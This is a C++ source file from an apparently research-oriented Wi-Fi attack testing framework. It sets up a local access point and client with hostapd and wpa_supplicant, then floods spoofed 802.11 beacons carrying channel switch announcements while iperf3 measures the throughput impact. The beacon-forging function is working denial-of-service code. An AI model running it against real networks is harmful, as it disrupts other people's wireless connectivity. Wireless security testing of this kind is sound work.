#include "attacks/channel_switch/channel_switch.h"
#include "logger/error_log.h"
#include <cassert>
#include "ex_program/hostapd/hostpad.h"
#include "logger/log.h"
#include <thread>
#include <chrono>
#include "config/hw_capabilities.h"
#include <filesystem>

using namespace std;
using namespace Tins;

void send_CSA_beacon(const HWAddress<6> &ap_mac,
                     const NetworkInterface &iface,
                     const string &ssid,
                     const int ap_channel,
                     const int new_channel) {

    Dot11Beacon beacon;
    beacon.addr1(Dot11::BROADCAST);
    beacon.addr2(ap_mac);
    beacon.addr3(ap_mac);
    beacon.ssid(ssid);
    beacon.ds_parameter_set(ap_channel);

    Dot11ManagementFrame::channel_switch_type cs;
    cs.switch_mode = 1;
    cs.new_channel = new_channel;
    cs.switch_count = 3;
    beacon.channel_switch(cs);

    RadioTap radiotap;
    const int freq_mhz = hw_capabilities::channel_to_freq_mhz(ap_channel);
    radiotap.channel(freq_mhz, RadioTap::OFDM);
    radiotap.inner_pdu(beacon);

    PacketSender sender;
    sender.send(radiotap, iface);
}

auto check_vulnerable(
    const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac,
    const string &iface_name, const string &ssid,
    const int ap_channel, int new_channel,
    const int ms_interval,const int attack_time)->void{

    const NetworkInterface iface(iface_name);

    const auto start_time = chrono::steady_clock::now();
    const auto end_time = start_time + chrono::seconds(attack_time);

    while (chrono::steady_clock::now() < end_time) {
        log(LogLevel::DEBUG, "sending CSA");
        send_CSA_beacon(ap_mac, iface, ssid, ap_channel, new_channel);
        this_thread::sleep_for(chrono::milliseconds(ms_interval));
    }

    cout << "check_vulnerable called with:\n"
              << "AP MAC: " << ap_mac << "\n"
              << "STA MAC: " << sta_mac << "\n"
              << "Interface: " << iface_name << "\n"
              << "Channel: " << ap_channel << "\n"
              << "SSID: " << ssid << endl;
}

void speed_observation_start(RunStatus& rs){
    namespace fs = std::filesystem;

    //system("sudo killall -9 iperf3 2>/dev/null");
    //std::this_thread::sleep_for(std::chrono::milliseconds(200));

    /*const vector<string> ip_up = {"sudo", "ip", "link", "set", rs.get_actor("access_point")["iface"], "up"};
    rs.process_manager.run("ip_up_AP", ip_up);
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
    const vector<string> ip_up2 = {"sudo", "ip", "link", "set", rs.get_actor("client")["iface"], "up"};
    rs.process_manager.run("ip_up_STA", ip_up2);
    std::this_thread::sleep_for(std::chrono::milliseconds(500));*/

    const fs::path obs_dir = fs::path(rs.run_folder) / "observer" / "iperf";
    std::error_code ec;
    fs::create_directories(obs_dir, ec);
    if (ec) {
        log(LogLevel::ERROR,
            "Failed to create iperf observer dir %s: %s",
            obs_dir.string().c_str(), ec.message().c_str());
    }
    const vector<string> iperf_server_arg = {
        "stdbuf", "-oL", "-eL",
        "iperf3",
        "-s",
        "-1",
        "-B", "10.0.0.1"   // explicitní bind
    };

    rs.process_manager.run("iperf_server", iperf_server_arg, obs_dir);
    rs.process_manager.wait_for("iperf_server", "Server listening");

    const int attack_time = rs.config["attack_config"]["attack_time"];
    const vector<string> iperf_client_arg = {
        "stdbuf", "-oL", "-eL",
        "iperf3",
        "-c", "10.0.0.1",
        "-u", // udo, because is is not buffered
        "-b", "100M",
        "-B", "10.0.0.2",
        "-t", std::to_string(attack_time)
    };
    rs.process_manager.run("iperf_client", iperf_client_arg, obs_dir);

};

// ----------------- MODULE functions ------------------
void setup_chs_attack(RunStatus& rs){

    if (rs.config["actors"]["access_point"]["source"] != "internal") {
        throw runtime_error("only internal access_point is supported");
    }
    if (rs.config["actors"]["client"]["source"] != "internal") {
        throw runtime_error("only internal access_point is supported");
    }

    const string hostapd_config_path = hostapd_config(rs.run_folder, rs.config["actors"]["access_point"]["setup"]["program_config"]);
    const string wpa_supp_config_path = wpa_supplicant_config(rs.run_folder, rs.config["actors"]["client"]["setup"]["program_config"]);

    const vector<string> hostapd_args = {
        "sudo",
        "hostapd",
        "-i",
        rs.get_actor("access_point")["iface"],
        hostapd_config_path
    };
    rs.process_manager.run("access_point", hostapd_args);
    rs.process_manager.wait_for("access_point", "AP-ENABLED");

    const vector<string> ip_addr_add_args_server = {  //TODO make more generic
        "sudo","ip", "addr","add", "10.0.0.1/24", "dev",
        rs.get_actor("access_point")["iface"]
    };
    rs.process_manager.run("ip_addr_add_AP", ip_addr_add_args_server);
    //TODO sync
	log(LogLevel::INFO, "access_point is running");

	const vector<string> wpa_supplicant_args = {
	    "sudo",
        "wpa_supplicant",
        "-i",
        rs.get_actor("client")["iface"],
		"-c",
    	wpa_supp_config_path
	};
	rs.process_manager.run("client", wpa_supplicant_args);
    rs.process_manager.wait_for("client", "Successfully initialized wpa_supplicant");

    const vector<string> ip_addr_add_args_STA = {  //TODO make more generic
        "sudo","ip", "addr","add", "10.0.0.2/24", "dev",
        rs.get_actor("client")["iface"]
    };
    rs.process_manager.run("ip_addr_add_STA", ip_addr_add_args_STA);
    //TODO sync?
    rs.process_manager.wait_for("client", "EVENT-CONNECTED");
	log(LogLevel::INFO, "client is connected");

    rs.process_manager.wait_for("access_point", "EAPOL-4WAY-HS-COMPLETED");
}


void speed_observation_stop(RunStatus& rs){
    rs.process_manager.stop("iperf_server");
    rs.process_manager.stop("iperf_client");
};

void run_chs_attack(RunStatus& rs){

    const HWAddress<6> ap_mac(rs.get_actor("access_point")["mac"]);
    const HWAddress<6> sta_mac(rs.get_actor("client")["mac"]);
    const string iface_name = rs.get_actor("attacker")["iface"];
    const string essid = rs.config["actors"]["access_point"]["setup"]["program_config"]["ssid"];
    const int old_channel = rs.config["actors"]["access_point"]["setup"]["channel"];
    const int new_channel = rs.config["attack_config"]["new_channel"];
    const int ms_interval = rs.config["attack_config"]["ms_interval"];
    const int attack_time = rs.config["attack_config"]["attack_time"];

    // TODO setup_speed_observer na mon módu
    // tshark -i wlan0 -n -q -z io,stat,1,"eth.addr == "
    //TODO log  client, CTRL-EVENT-STARTED-CHANNEL-SWITCH
    //TODO log client, CTRL-EVENT-DISCONNECTED
    //std::this_thread::sleep_for(std::chrono::seconds(3));
    speed_observation_start(rs);
    check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel, ms_interval, attack_time);
    speed_observation_stop(rs);
    log(LogLevel::INFO,"-----------------------END");

    //std::this_thread::sleep_for(std::chrono::seconds(9000));

    //throw not_implemented_error("Run not implemented");
}

void result_attack(RunStatus& rs){
    //TODO
}